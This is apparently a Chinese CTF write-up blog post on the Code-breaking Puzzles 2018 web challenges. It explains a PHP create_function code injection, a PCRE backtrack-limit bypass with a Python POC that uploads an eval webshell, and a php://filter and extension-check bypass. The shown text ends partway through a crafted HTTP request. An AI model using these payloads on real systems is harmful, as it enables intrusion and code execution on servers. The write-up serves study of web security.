<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00前言题目知识点概述：  function PHP函数利用技巧 pcrewaf PHP正则特性 phpmagic PHP写文件技巧 phplimit PHP代码执行限制绕过 nodechr Javascript字符串特性 javacon SPEL表达式沙盒绕过 lumenserial 反序列化在7.2下的利用 picklecode Python反序列化沙盒绕过 thejs Javascrip">
<meta property="og:type" content="article">
<meta property="og:title" content="Code-breaking Puzzles 2018 Note">
<meta property="og:url" content="http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x00前言题目知识点概述：  function PHP函数利用技巧 pcrewaf PHP正则特性 phpmagic PHP写文件技巧 phplimit PHP代码执行限制绕过 nodechr Javascript字符串特性 javacon SPEL表达式沙盒绕过 lumenserial 反序列化在7.2下的利用 picklecode Python反序列化沙盒绕过 thejs Javascrip">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2020/06/04/aiYyHN4MxwXjGrA.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/itv2VnEGmoTgcdQ.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/MBCDKwWd1STzj3g.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/v4BpzdmSoRl1fLY.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/qB45j72EhPvSmiR.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/QreI4gdL2FV8Yny.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/rTmCKdtoAf8GyhU.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/U9mFsQtNZe8nSpu.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/vxsyGtKFm4WMlon.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/nGRtrgNpxbYfZ8c.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/WtPgK6V9yrzF3cl.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/QmCRgJausZ3DBLj.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/8FTaxUZ2pXgVstD.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/2v1Q5BEhLMrf7Wy.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/RWBNjZwgYerDVUv.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/do6mDh1Qrb4ZkON.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/1cQKxe8DtFWPngT.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/TJKoxFlDg6CupI5.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/i9dxGr36fVF8ktJ.png">
<meta property="og:image" content="https://i.loli.net/2020/06/04/cG57yEqtanx9bV3.png">
<meta property="og:image" content="https://pic.downk.cc/item/5ed863e9c2a9a83be5b390ba.png">
<meta property="og:image" content="https://pic.downk.cc/item/5ed8640ac2a9a83be5b3b4e6.png">
<meta property="og:image" content="https://pic.downk.cc/item/5ed86424c2a9a83be5b3d1d4.png">
<meta property="og:image" content="https://pic.downk.cc/item/5ed86439c2a9a83be5b3e7ba.png">
<meta property="og:updated_time" content="2020-06-04T03:02:44.778Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Code-breaking Puzzles 2018 Note">
<meta name="twitter:description" content="0x00前言题目知识点概述：  function PHP函数利用技巧 pcrewaf PHP正则特性 phpmagic PHP写文件技巧 phplimit PHP代码执行限制绕过 nodechr Javascript字符串特性 javacon SPEL表达式沙盒绕过 lumenserial 反序列化在7.2下的利用 picklecode Python反序列化沙盒绕过 thejs Javascrip">
<meta name="twitter:image" content="https://i.loli.net/2020/06/04/aiYyHN4MxwXjGrA.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Code-breaking Puzzles 2018 Note</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/04/FUSE-Finding-File-Upload-Bugs-via-Penetration-Testing/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/09/15/2019-starctf-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&text=Code-breaking Puzzles 2018 Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&is_video=false&description=Code-breaking Puzzles 2018 Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Code-breaking Puzzles 2018 Note&body=Check out this article: http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&name=Code-breaking Puzzles 2018 Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-function"><span class="toc-number">2.</span> <span class="toc-text">0x01 function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-解决正则问题"><span class="toc-number">2.1.</span> <span class="toc-text">1.解决正则问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-create-function-gt-rce"><span class="toc-number">2.2.</span> <span class="toc-text">2.create_function-&gt;rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-pcrewaf"><span class="toc-number">3.</span> <span class="toc-text">0x02 pcrewaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-phpmagic"><span class="toc-number">4.</span> <span class="toc-text">0x03 phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SERVER-‘SERVER-NAME’"><span class="toc-number">4.1.</span> <span class="toc-text">1.$_SERVER[‘SERVER_NAME’]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解决扩展名过滤问题"><span class="toc-number">4.2.</span> <span class="toc-text">2.解决扩展名过滤问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-解决htmlspecialchars过滤问题"><span class="toc-number">4.3.</span> <span class="toc-text">3.解决htmlspecialchars过滤问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-寻找可控变量构造payload"><span class="toc-number">4.4.</span> <span class="toc-text">4.寻找可控变量构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-phplimit"><span class="toc-number">5.</span> <span class="toc-text">0x04 phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-session-id"><span class="toc-number">5.1.</span> <span class="toc-text">1.session_id</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-get-defined-vars"><span class="toc-number">5.2.</span> <span class="toc-text">2.get_defined_vars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-getcwd"><span class="toc-number">5.3.</span> <span class="toc-text">3. getcwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-getallheaders"><span class="toc-number">5.4.</span> <span class="toc-text">4.getallheaders</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-getenv"><span class="toc-number">5.5.</span> <span class="toc-text">5.getenv</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-nodechr"><span class="toc-number">6.</span> <span class="toc-text">0x05 nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-toUpperCase-和toLowerCase-特性"><span class="toc-number">6.1.</span> <span class="toc-text">1.toUpperCase()和toLowerCase()特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-unicode大小写转换问题"><span class="toc-number">6.2.</span> <span class="toc-text">2.unicode大小写转换问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-lumenserial"><span class="toc-number">7.</span> <span class="toc-text">0x06 lumenserial</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-环境配置"><span class="toc-number">7.1.</span> <span class="toc-text">1. 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-phpggc"><span class="toc-number">7.2.</span> <span class="toc-text">2. phpggc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一种"><span class="toc-number">7.2.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二种"><span class="toc-number">7.2.2.</span> <span class="toc-text">第二种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三种"><span class="toc-number">7.2.3.</span> <span class="toc-text">第三种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第四种"><span class="toc-number">7.2.4.</span> <span class="toc-text">第四种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小结"><span class="toc-number">7.2.5.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POP-chain的构造"><span class="toc-number">7.3.</span> <span class="toc-text">3. POP chain的构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chain-1"><span class="toc-number">7.3.1.</span> <span class="toc-text">chain 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chain-2"><span class="toc-number">7.3.2.</span> <span class="toc-text">chain 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小结-1"><span class="toc-number">7.3.3.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补充"><span class="toc-number">7.3.4.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-javacon"><span class="toc-number">8.</span> <span class="toc-text">0x07 javacon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-环境配置-1"><span class="toc-number">8.1.</span> <span class="toc-text">1. 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞相关知识点"><span class="toc-number">8.2.</span> <span class="toc-text">2. 漏洞相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-EL表达式"><span class="toc-number">8.2.1.</span> <span class="toc-text">2.1 EL表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-SpEL表达式注入"><span class="toc-number">8.2.2.</span> <span class="toc-text">2.2 SpEL表达式注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-反射"><span class="toc-number">8.2.3.</span> <span class="toc-text">2.3 反射</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-漏洞调试分析"><span class="toc-number">8.3.</span> <span class="toc-text">3. 漏洞调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-thejs"><span class="toc-number">9.</span> <span class="toc-text">0x08 thejs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-漏洞相关知识点"><span class="toc-number">9.1.</span> <span class="toc-text">1. 漏洞相关知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-题目解答"><span class="toc-number">9.2.</span> <span class="toc-text">2. 题目解答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-参考"><span class="toc-number">9.3.</span> <span class="toc-text">3. 参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-picklecode"><span class="toc-number">10.</span> <span class="toc-text">0x09 picklecode</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Code-breaking Puzzles 2018 Note
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-06-04T02:44:31.000Z" itemprop="datePublished">2020-06-04</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>题目知识点概述：</p>
<ol>
<li>function PHP函数利用技巧</li>
<li>pcrewaf PHP正则特性</li>
<li>phpmagic PHP写文件技巧</li>
<li>phplimit PHP代码执行限制绕过</li>
<li>nodechr Javascript字符串特性</li>
<li>javacon SPEL表达式沙盒绕过</li>
<li>lumenserial 反序列化在7.2下的利用</li>
<li>picklecode Python反序列化沙盒绕过</li>
<li>thejs Javascript的原型污染漏洞</li>
</ol>
<p>题目来源：<a href="https://code-breaking.com/" target="_blank" rel="noopener">Website</a> | <a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">Github</a></p>
<p>PS: 比较早写的笔记，但是一直没时间补完(这笔记好像拖了快一年？？？)，暂时不补充了；特点是详细，感觉新手也能看得懂</p>
<h2 id="0x01-function"><a href="#0x01-function" class="headerlink" title="0x01 function"></a>0x01 function</h2><p>代码以及题目环境可以从Github上找到，一下不在赘述，只提及知识点，</p>
<h3 id="1-解决正则问题"><a href="#1-解决正则问题" class="headerlink" title="1.解决正则问题"></a>1.解决正则问题</h3><p><code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code>，<code>$action</code>中要出现数字字母下划线以外的字符。<br>可以直接使用burp对字符进行测试(但这个字符必须还是有用的)</p>
<p><img src="https://i.loli.net/2020/06/04/aiYyHN4MxwXjGrA.png" alt="4D3EEB6F-D725-4532-A1BD-17720F6F5BA6.png"></p>
<p>PS:网上有的说在这里测试ASCII字符，其实就是有效字符的意思</p>
<p>至于为什么是 <code>\</code>：</p>
<blockquote>
<p>code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c？<br>其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
</blockquote>
<p>就是\在php中表示默认的命名空间，比如写一些类的时候会在开头写<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-create-function-gt-rce"><a href="#2-create-function-gt-rce" class="headerlink" title="2.create_function-&gt;rce"></a>2.create_function-&gt;rce</h3><p>使用<code>create_function(&#39;&#39;, $_GET[&#39;code&#39;]);</code>达到远程RCE的效果</p>
<p>具体可以看php的源码 Zend/zend_builtin_functions.c:1858</p>
<p>可见用户输入的参数是function_args、function_code，他们被拼接成一个完整的PHP函数：</p>
<p><code>function __lambda_func ( function_args ) { function_code } \0</code></p>
<p>这个函数代码会先放在zend_eval_stringl里执行，可以理解为eval。执行成功后，再于函数列表中找到<strong>lambda_func函数，将其重命名成lambda_%d，%d代表“这是本进程第几个匿名函数”。最后从函数列表里删除</strong>lambda_func。</p>
<p>由于代码就是简单的拼接，所以我们可以闭合括号，执行任意代码。比如：</p>
<ol>
<li>如果可控在第一个参数，需要闭合圆括号和大括号：create_function(‘){}phpinfo();//‘, ‘’);</li>
<li>如果可控在第二个参数，需要闭合大括号：create_function(‘’, ‘}phpinfo();//‘);</li>
</ol>
<p>PS:</p>
<ol>
<li><p>扩展一下，类似的eval也是将其中的字符串与进行拼接<br><code>&quot;&lt;?php &quot;.$code.&quot;?&gt;&quot;</code><br>从而可以传入图?&gt;、&lt;?php闭合前后的标签，让中间的代码块不会被当作php代码执行。</p>
</li>
<li><p>补充两个CTF常用的查看文件的函数</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(scandir(&apos;../&apos;));/*</span><br><span class="line"></span><br><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));/*</span><br></pre></td></tr></table></figure>
<h2 id="0x02-pcrewaf"><a href="#0x02-pcrewaf" class="headerlink" title="0x02 pcrewaf"></a>0x02 pcrewaf</h2><p>关键在于正则匹配的绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先要知道正则的匹配流程和引擎</p>
<blockquote>
<p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入<br>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
</blockquote>
<p>PHP采用的是NFA的正则引擎，具体的解析见 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">《PHP利用PCRE回溯次数限制绕过某些安全限制》</a></p>
<p>利用则是通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>
<p>POC<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://51.158.75.42:8088/index.php'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure></p>
<p>or<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(<span class="string">"&lt;?php print_r(scandir('../../../'));print_r(file_get_contents('../../../flag_php7_2_1s_c0rrect'));/*"</span>+<span class="string">'A'</span>*<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure></p>
<p>也可以使用<code>readfile</code>函数来读取文件<br>此类型的修复方式是使用强等于的方式来判断匹配的结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>PS: 这个题目在最初是存在一个非预期解的，当时的正则如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[\(\`].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种形式是可以使用glob+file_get_contents来获取flag的，具体形式如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chopper=var_dump(glob(&apos;../../../*&apos;));</span><br><span class="line">chopper=var_dump(file_get_contents(&apos;../../../flag_php7_2_1s_c0rrect&apos;));</span><br></pre></td></tr></table></figure></p>
<p>glob()函数是获取与模式匹配的文件路径，找到文件后直接读取。<br>之后的正则修改为了现在的形式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-phpmagic"><a href="#0x03-phpmagic" class="headerlink" title="0x03 phpmagic"></a>0x03 phpmagic</h2><p>关键在于文件写入的地方<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">    file_put_contents($log_name, $output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="1-SERVER-‘SERVER-NAME’"><a href="#1-SERVER-‘SERVER-NAME’" class="headerlink" title="1.$_SERVER[‘SERVER_NAME’]"></a>1.$_SERVER[‘SERVER_NAME’]</h3><p>(1) 查看官方手册发现$_SERVER[‘SERVER_NAME’]是可以被我们控制的，只要修改数据包中host字段的值就好<br><img src="https://i.loli.net/2020/06/04/itv2VnEGmoTgcdQ.png" alt="87A5F220-D3F9-4BC8-B5D3-2ABA6F3A8077.png"></p>
<p>(2) <code>$log_name</code>来自<code>$_POST[&#39;log&#39;]</code>因而也可控</p>
<h3 id="2-解决扩展名过滤问题"><a href="#2-解决扩展名过滤问题" class="headerlink" title="2.解决扩展名过滤问题"></a>2.解决扩展名过滤问题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
<p>使用如下payload可以绕过pathinfo对后缀名的检测，进而将内容正常写入filename.php文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=shell.php/.&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="3-解决htmlspecialchars过滤问题"><a href="#3-解决htmlspecialchars过滤问题" class="headerlink" title="3.解决htmlspecialchars过滤问题"></a>3.解决htmlspecialchars过滤问题</h3><p>htmlspecialchars函数会将’&lt;’转为’&lt;’，因而不能够直接写webshell。但是 phithon 曾在一篇文章中提到使用PHP伪协议+base64/rot13编码和解码过程处理掉exit–<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">《谈一谈php://filter的妙用》</a></p>
<p>PS:</p>
<ol>
<li>base64必须是4的整数倍；</li>
<li>要注意base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有=；</li>
<li>PHP伪协议base64解码的trick：解码中遇到不符合规范的字符直接跳过。</li>
</ol>
<p>PHP具有一个特点：一切传入filename的地方都可以使用php伪协议，比如：file_put_contents和readfile函数。在解析phar的时候曾提到过大量的此类函数。</p>
<h3 id="4-寻找可控变量构造payload"><a href="#4-寻找可控变量构造payload" class="headerlink" title="4.寻找可控变量构造payload"></a>4.寻找可控变量构造payload</h3><p>可以看到$domain内容可控</p>
<p><img src="https://i.loli.net/2020/06/04/MBCDKwWd1STzj3g.png" alt="163EC8AD-F408-4BF0-BA9F-0B9F455715CA.png"></p>
<p>构造可利用的base64字符串，最终的数据包如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1:8082/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 